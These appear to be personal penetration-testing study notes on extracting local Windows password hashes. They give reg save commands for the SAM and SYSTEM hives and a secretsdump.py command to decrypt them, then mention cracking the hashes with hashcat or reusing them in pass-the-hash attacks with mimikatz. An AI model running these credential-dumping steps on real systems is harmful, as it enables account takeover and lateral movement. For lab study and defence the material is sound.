we could also try to dump the SAM database using registry hives, by doing:

reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg

then, we can decrypt it using one of the impacket tools (secretsdump.py)
python3 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
(command could be iffy, update it accordingly. think i covered this in
exploiting AD too)

once we obtain the NTLM hashes, we can try to use hashcat to crack them
if they are guessable, otherwise we can use them in PTH attacks with mimi

note - if you use metasploit to get a hashdump, the result will be different
then manually parsing them because some of the NTLM hashes metasploit 
recovers are from the AD network rather than the local machine which is
stored inside of the SECURITY file, which would need to be dumped in order
to decrypt those rather than the SYSTEM hive.
